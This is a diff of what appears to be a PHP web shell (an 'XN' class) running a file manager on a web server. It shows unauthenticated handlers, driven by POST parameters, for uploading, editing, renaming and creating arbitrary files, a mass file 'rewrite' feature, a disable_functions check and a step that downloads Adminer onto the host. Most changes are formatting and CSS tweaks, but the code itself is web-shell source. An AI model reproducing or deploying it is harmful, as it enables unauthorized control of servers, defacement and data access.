@@ -388,7 +388,7 @@ class XN
             case 'disable_function':
                 return !empty(@ini_get("disable_functions"))
                     ? @ini_get("disable_functions")
-                    : "<font color=green>NONE</font>";
+                    : "NONE";
                 break;
             case 'mysql':
                 return function_exists('mysql_connect')
@@ -1146,7 +1146,7 @@ function alert($message)
         overflow: hidden;
         text-align: left;
         border-radius:10px;
-        height:625px;
+        height:98%;
         background: #fff;
         width:50%;
     }
@@ -1157,7 +1157,7 @@ function alert($message)
         padding-left:20px;
         padding-right: 20px;
         overflow-x: hidden;
-        height:420px;
+        height:75%;
 
     }
     .rewrite-success {
@@ -1696,13 +1696,13 @@ function alert($message)
             width:98%;
         }
         .table {
-            height:440px;
+            height:75.5%;
         }
         .files {
             box-shadow: none;
             border-radius:0;
             width:100%;
-            height:650px;
+            height:100%;
         }
         .block .date .dir-size,
         .block .date .file-size {
@@ -2009,29 +2009,21 @@ function filterTable() {
             break;
 
         case 'backup':
-            if (
-                XN::save(
-                    $_POST['file'] . ".bak",
-                    file_get_contents($_POST['file'])
-                )
-            ) {
+            if (XN::save($_POST['file'] . ".bak", file_get_contents($_POST['file']))) {
                 alert('failed');
             } else {
                 alert("" . basename($_POST['file']) . " has been backup !");
             }
             break;
         case 'adminer':
-            head('Adminer', getcwd(), 'hidden');
+        	head('Adminer', getcwd(), 'hidden');
             if (file_exists('adminer.php')) { ?>
                 <div class="adminer">
                     <a href="adminer.php" target="_blank">Login Adminer</a>
                 </div>
-                <?php } else {if (
-                    XN::adminer(
-                        'https://www.adminer.org/static/download/4.7.7/adminer-4.7.7.php',
-                        'adminer.php'
-                    )
-                ) { ?>
+                <?php } 
+                else { 
+                	if (XN::adminer('https://www.adminer.org/static/download/4.7.7/adminer-4.7.7.php','adminer.php')) { ?>
                     <div class="adminer">
                         <span>
                             Successfully created Adminer.php
@@ -2114,11 +2106,8 @@ function filterTable() {
                                     <b><?= $data ?></b>
                                 </td>
                             </tr>
-                            <?php XN::rewrite(
-                                $_POST['dir'],
-                                $data,
-                                $_POST['text']
-                            );}
+                            <?php XN::rewrite($_POST['dir'],$data,$_POST['text']);
+                        }
                         }
                     }
                 } ?>
@@ -2128,7 +2117,6 @@ function filterTable() {
                 break;
 
         case 'adddir':
-
             if (isset($_POST['adddir'])) {
                 $dirname = $_POST['dirname'];
                 for ($i = 0; $i < count($dirname); $i++) {
@@ -2166,7 +2154,6 @@ function filterTable() {
             break;
 
         case 'addfile':
-
             if (isset($_POST['addfile'])) {
                 XN::addfile($_POST['filename'], $_POST['data']);
             }
@@ -2203,7 +2190,6 @@ function filterTable() {
             <?php
             exit();
             break;
-
         case 'upload':
             head('Upload', getcwd(), 'hidden'); ?>
             <div class="upload">
@@ -2225,35 +2211,25 @@ function filterTable() {
             if (isset($_POST['upload'])) {
                 $files = count($_FILES['file']['tmp_name']);
                 for ($i = 0; $i < $files; $i++) {
-                    if (
-                        copy(
-                            $_FILES['file']['tmp_name'][$i],
-                            $_FILES['file']['name'][$i]
-                        )
-                    ) { ?>
+                    if (copy($_FILES['file']['tmp_name'][$i],$_FILES['file']['name'][$i])) { ?>
                         <?= $_FILES['file']['name'][$i] ?>
-                    <?php } else {alert('Upload failed !');}
+                    <?php } 
+                    else { 
+                    	alert('Upload failed !');
+                    }
                 }
             }
             exit();
             break;
 
         case 'rename':
-            if (
-                @rename(
-                    $_POST['file'],
-                    getcwd() . DIRECTORY_SEPARATOR . $_POST['newname']
-                )
-            ) {
+            if (@rename($_POST['file'],getcwd().DIRECTORY_SEPARATOR.$_POST['newname'])) {
                 print "<script>window.location='?x=" . getcwd() . "'</script>";
             } else {
-                print "<script>window.location='?x=" .
-                    getcwd() .
-                    "&failed=Rename'</script>";
+                print "<script>window.location='?x=".getcwd()."&failed=Rename'</script>";
             }
             exit();
         case 'edit':
-
             if (isset($_POST['save'])) {
                 if (XN::save($_POST['file'], $_POST['data'])) {
                     alert("Permission Danied");
@@ -2272,11 +2248,7 @@ function filterTable() {
                         <td>:</td>
                         <td>
                             <div class="editname">
-                                <?= XN::wr(
-                                    basename($_POST['file']),
-                                    basename($_POST['file']),
-                                    2
-                                ) ?>
+                                <?= XN::wr(basename($_POST['file']),basename($_POST['file']),2) ?>
                             </div>
                         </td>
                     </tr>
@@ -2314,9 +2286,7 @@ function filterTable() {
                     <form method="post">
                         <tr>
                             <td colspan="3">
-                                <textarea name="data"><?= htmlspecialchars(
-                                    file_get_contents($_POST['file'])
-                                ) ?></textarea>
+                                <textarea name="data"><?= htmlspecialchars(file_get_contents($_POST['file'])) ?></textarea>
                             </td>
                         </tr>
                         <tr>
@@ -2356,9 +2326,7 @@ function filterTable() {
             <tr>
                 <td class="border1 hover">
                     <div class="block">
-                        <a href="?x=<?= $dir['name'] ?>" title="<?= $dir[
-    'names'
-] ?>">
+                        <a href="?x=<?= $dir['name'] ?>" title="<?= $dir['names'] ?>">
                             <div class="img">
                                 <img src="https://image.flaticon.com/icons/svg/715/715676.svg">
                             </div>
@@ -2369,11 +2337,7 @@ function filterTable() {
                                         <?= $dir['size'] ?>
                                     </div>
                                     <div class="dir-perms">
-                                        <?= XN::wr(
-                                            $dir['name'],
-                                            XN::perms($dir['name']),
-                                            2
-                                        ) ?>
+                                        <?= XN::wr($dir['name'],XN::perms($dir['name']),2) ?>
                                     </div>
                                     <div class="dir-time">
                                         <?= $dir['ftime'] ?>
